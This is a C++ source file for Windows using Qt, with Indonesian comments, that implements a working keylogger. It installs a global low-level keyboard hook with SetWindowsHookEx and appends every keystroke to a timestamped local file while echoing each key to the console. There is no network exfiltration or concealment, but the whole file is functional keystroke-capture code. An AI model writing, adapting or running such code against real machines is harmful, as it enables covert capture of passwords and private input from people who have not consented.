#include <QcoreApplication>
#include <QDebug>
#include <QTime>
#include <QChar>
#include <QString>
#include <iostream>
#include <fstream>
#include <Windows.h>
#pragma comment(lib, "user32.lib")

HHOOK hHook = NULL;

using namespace std;

//variable fileName untuk input nama file
char fileName[256];

void UpdateKeyState(BYTE *keystate, int keycode){

    keystate[keycode] = GetKeyState(keycode);
}

LRESULT CALLBACK MyLowLevelKeyBoardProc (int nCode, WPARAM wParam, LPARAM lParam){

    qDebug() << "Key Pressed";

    //informasi key
    KBDLLHOOKSTRUCT cKey = *((KBDLLHOOKSTRUCT*)lParam);

    wchar_t buffer[5];

    //status keyboard
    BYTE keyboard_state[256];
    GetKeyboardState(keyboard_state);
    UpdateKeyState(keyboard_state, VK_SHIFT);
    UpdateKeyState(keyboard_state, VK_CAPITAL);
    UpdateKeyState(keyboard_state, VK_CONTROL);
    UpdateKeyState(keyboard_state, VK_MENU);

    //layout keyboard (us keyboard/chineese kb,dll)
    HKL keyboard_layout = GetKeyboardLayout(0);

    //Nama button keyboard
    char lpszName[0x100] = {0};

    //Microsoft Black Magic (dapet dari internet)
    DWORD dwMsg =1;
    dwMsg += cKey.scanCode << 16;
    dwMsg += cKey.flags << 24;

    int i = GetKeyNameText(dwMsg, (LPTSTR)lpszName,255);

    //konversi key
    int result = ToUnicodeEx(cKey.vkCode, cKey.scanCode, keyboard_state, buffer, 4, 0, keyboard_layout);
    //input last char agar terbentuk string
    buffer[4] = L'\0';

    //Print output
    qDebug() << "key: " << cKey.vkCode << " " << QString::fromUtf16((ushort*)buffer) << " " << QString::fromUtf16((ushort*)lpszName);


    //Save into file
    QString qs= QString::fromUtf16((ushort*)buffer);
    std::string inputkb = qs.toUtf8().constData();
    cout << inputkb << endl;
    if (wParam==WM_KEYDOWN){
        ofstream myfile;
        string namef= fileName;
        myfile.open (namef.c_str(), ios::app);
        myfile << inputkb;
        myfile.close();
        cout << "save to file : " << namef << endl;
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

wchar_t *convertCharArrayToLPCWSTR(const char* charArray)
{
    wchar_t* wString=new wchar_t[4096];
    MultiByteToWideChar(CP_ACP, 0, charArray, -1, wString, 4096);
    return wString;
}

int main (int argc, char *argv[]){

    QCoreApplication a(argc, argv);
    //variabel time untuk mencatat waktu
    SYSTEMTIME time;
    //catat waktu saat ini
    GetSystemTime(&time);
    //input nama file dari waktu yang telah dicatat
    sprintf(fileName, "%04d%02d%02d-%02d%02d%02d",time.wYear,time.wMonth,time.wDay,time.wHour+7, time.wMinute,time.wSecond);

    cout << "File Name : " << fileName << endl;
    //variable fn sebagai input nama file
    LPCWSTR fn;
    //input nama file dari 'fileName' yang telah diisi tanggal dan waktu
    fn= convertCharArrayToLPCWSTR(fileName);

    //Create File
    HANDLE hf= CreateFile(fn, GENERIC_READ | GENERIC_WRITE, (DWORD) 2, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, (HANDLE) NULL);
    if (hf == INVALID_HANDLE_VALUE){

        qDebug() << "File gagal dibuat.";
    }else{

        qDebug() << "File berhasil dibuat.";
    }

    //Lakukan hook dan call fungsi MyLowLevelKeyBoardProc
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, MyLowLevelKeyBoardProc, NULL, 0);
    if(hHook == NULL){
        qDebug() << "Hook Failed";
    }
    //looping proses
    return a.exec();
}
